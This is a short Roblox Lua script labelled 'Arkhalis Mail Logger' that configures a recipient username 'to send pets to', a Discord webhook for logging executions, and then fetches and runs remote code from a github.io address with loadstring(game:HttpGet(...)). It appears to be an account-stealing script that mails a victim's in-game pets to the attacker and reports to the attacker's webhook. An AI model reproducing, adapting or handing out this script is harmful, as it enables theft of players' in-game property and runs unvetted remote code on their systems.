--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username = "z5vxgt" --// Username To Send Pets To
_G.Diamonds = 1000000000 --// Amount Of Diamonds To Not Kick

--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1109365758192009276/hmpPwZbB4QnMCnegSk2e5XJXF1kwJiG_MnYIpcxmwPQCtZfAWK9_rLAT_Ui3Ixt3yOgT" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
